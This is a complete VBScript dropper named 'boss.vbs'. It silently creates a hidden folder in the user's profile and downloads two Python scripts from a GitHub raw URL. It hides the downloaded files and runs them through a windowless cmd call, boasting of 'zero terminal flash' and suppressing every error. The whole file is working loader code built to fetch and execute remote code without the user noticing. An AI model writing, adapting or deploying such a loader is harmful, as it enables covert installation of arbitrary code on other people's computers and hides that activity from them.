Option Explicit

' ============================================================
' boss.vbs - downloads auto.py + client.py, runs:
'   py auto.py client.py --hidden
' Zero terminal flash. Uses py.exe only (bare, via PATH).
' ============================================================

Dim sh, fso, userProfile, configPath, clientPath, autoPath
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

userProfile = sh.ExpandEnvironmentStrings("%USERPROFILE%")
If userProfile = "%USERPROFILE%" Or userProfile = "" Then WScript.Quit 1

configPath = fso.BuildPath(userProfile, ".configs")
clientPath = fso.BuildPath(configPath, "client.py")
autoPath   = fso.BuildPath(configPath, "auto.py")

' ---- 1. Create .configs silently ----
On Error Resume Next
If Not fso.FolderExists(configPath) Then fso.CreateFolder configPath
If Err.Number <> 0 Then WScript.Quit 1
Err.Clear

' ---- 2. Hide the folder ----
Dim folder
Set folder = fso.GetFolder(configPath)
If Err.Number = 0 Then
    folder.Attributes = folder.Attributes Or 2
    Err.Clear
End If

' ---- 3. Download both .py files ----
If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py", clientPath) Then WScript.Quit 1
If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py",   autoPath)   Then WScript.Quit 1

' ---- 4. Confirm py.exe is on PATH ----
If Not PyOnPath() Then
    MsgBox "py.exe (Python launcher) not found on PATH. Install Python from python.org with 'py launcher' ticked.", 16, "Error"
    WScript.Quit 1
End If

' ---- 5. Launch: hidden cmd /c cd /d <configPath> && py auto.py client.py --hidden ----
Dim cmd
cmd = "cmd.exe /c cd /d """ & configPath & """ && py auto.py client.py --hidden"

On Error Resume Next
sh.Run cmd, 0, False
If Err.Number <> 0 Then
    Err.Clear
    On Error GoTo 0
    WScript.Quit 1
End If
On Error GoTo 0

WScript.Quit 0

' ============================================================
' Function: PyOnPath  (validates bare "py" resolves)
' ============================================================
Function PyOnPath()
    Dim env, dirs, i, testPath
    PyOnPath = False

    env = sh.ExpandEnvironmentStrings("%PATH%")
    dirs = Split(env, ";")
    For i = 0 To UBound(dirs)
        If Len(Trim(dirs(i))) > 0 Then
            testPath = fso.BuildPath(Trim(dirs(i)), "py.exe")
            If fso.FileExists(testPath) Then
                PyOnPath = True
                Exit Function
            End If
        End If
    Next

    ' System-wide py.exe fallback
    testPath = sh.ExpandEnvironmentStrings("%SystemRoot%\py.exe")
    If fso.FileExists(testPath) Then
        PyOnPath = True
        Exit Function
    End If
End Function

' ============================================================
' Function: DownloadFile  (unchanged)
' ============================================================
Function DownloadFile(url, target)
    DownloadFile = False
    Dim http, stream, tempFile, f
    tempFile = target & ".download"

    On Error Resume Next
    If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
    Err.Clear

    If fso.FileExists(target) Then
        fso.GetFile(target).Attributes = 0
        Err.Clear
    End If

    Set http = CreateObject("MSXML2.XMLHTTP.6.0")
    If Err.Number <> 0 Then
        Err.Clear
        Set http = CreateObject("MSXML2.XMLHTTP")
    End If
    If Err.Number <> 0 Then Exit Function

    http.Open "GET", url, False
    http.Send

    If Err.Number <> 0 Or http.Status <> 200 Then
        Err.Clear
        If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
        Exit Function
    End If

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile tempFile, 2

    If Err.Number <> 0 Then
        Err.Clear
        If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
        Exit Function
    End If
    stream.Close

    If Not fso.FileExists(tempFile) Then Exit Function
    If fso.GetFile(tempFile).Size <= 0 Then
        fso.DeleteFile tempFile, True
        Exit Function
    End If

    fso.MoveFile tempFile, target
    If Err.Number <> 0 Then Exit Function

    Set f = fso.GetFile(target)
    f.Attributes = f.Attributes Or 2

    DownloadFile = True
    On Error GoTo 0
End Function
